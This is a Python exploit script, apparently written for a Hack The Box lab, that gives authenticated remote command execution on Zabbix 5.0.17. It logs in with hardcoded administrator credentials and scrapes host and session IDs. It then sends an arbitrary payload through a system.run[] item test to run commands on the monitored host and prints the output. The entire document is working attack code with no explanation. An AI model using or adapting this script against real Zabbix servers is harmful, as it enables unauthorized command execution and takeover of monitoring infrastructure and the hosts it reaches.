#!/usr/bin/python3

"""
Application: zabbix 5.0.17
Description: zabbix authenticated RCE through "system.run[]"
"""

import re
import requests as r
import json
import argparse


# print("/** Author: x00tex **/")
url = 'http://zabbix.shibboleth.htb'
username = 'Administrator'
password = 'ilovepumkinpie1'

s = r.session()
login = s.post(f'{url}/index.php',
               data={"name": username, "password": password, "autologin": 1, "enter": "Sign in"})


class Get_host:
    def __init__(self):
        rspn = s.get(f'{url}/hosts.php')
        self.hostid = re.findall(r'hostid=(.*?)">(.*?)</a>', rspn.text)
        self.sid = re.findall(r'sid=(.*?)\'', rspn.text)


def get_values():
    return Get_host()


def exploit(payload, mode):
    data = {"key": f"system.run[{payload},{mode}]", "delay": "", "value_type": 3, "item_type": 0, "itemid": 0,
            "interfaceid": 0, "get_value": 1, "interface[address]": "127.0.0.1", "interface[port]": 10050,
            "proxy_hostid": 0, "show_final_result": 1, "test_type": 0, "hostid": t.hostid[0][0], "valuemapid": 0, "value": ""}
    rce = s.post(f'{url}/zabbix.php?sid={t.sid[0]}&action=popup.itemtest.send', data=data)
    return rce.text


parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('--mode', default='wait', help='''wait: Enables command output(default)\nonwait: return boolean''')
parser.add_argument("--payload", help="payload")
args = parser.parse_args()


t = get_values()
print("[+] All Hosts")
for i in t.hostid:
    print(f"{i[1]}:{i[0]}")


output = json.loads((exploit(args.payload, args.mode)))
print('[+] Payload output')
if "value" in output:
    print(output["value"])
else:
    print(output)


s.close()
